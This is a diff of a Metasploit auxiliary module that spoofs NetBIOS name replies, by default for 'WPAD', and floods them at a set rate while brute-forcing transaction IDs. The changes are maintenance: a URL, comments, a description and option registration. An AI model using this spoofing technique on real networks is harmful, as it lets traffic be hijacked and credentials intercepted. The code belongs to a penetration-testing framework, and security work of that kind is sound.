@@ -1,10 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
 
@@ -38,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'Actions'     =>
         [
-          [ 'Service' ]
+          [ 'Service', 'Description' => 'Run listener for NetBIOS requests and respond to them' ]
         ],
       'PassiveActions' =>
         [
@@ -63,7 +60,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('NBNAME',     [ true, "The NetBIOS name to spoof a reply for", 'WPAD' ]),
         OptAddress.new('NBADDR',    [ true, "The address that the NetBIOS name should resolve to", Rex::Socket.source_address("50.50.50.50") ]),
         OptInt.new('PPSRATE',       [ true, "The rate at which to send NetBIOS replies", 1_000])
-      ], self.class)
+      ])
   end
 
   def netbios_service
@@ -110,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
   def netbios_spam
     payload =
         "\xff\xff"   + # TX ID (will brute force this)
-        "\x85\x00"   + # Flags = response + authoratative + recursion desired
+        "\x85\x00"   + # Flags = response + authoritative + recursion desired
         "\x00\x00"   + # Questions = 0
         "\x00\x01"   + # Answer RRs = 1
         "\x00\x00"   + # Authority RRs = 0
@@ -155,5 +152,4 @@ class MetasploitModule < Msf::Auxiliary
   def run
     loop { netbios_service }
   end
-
 end
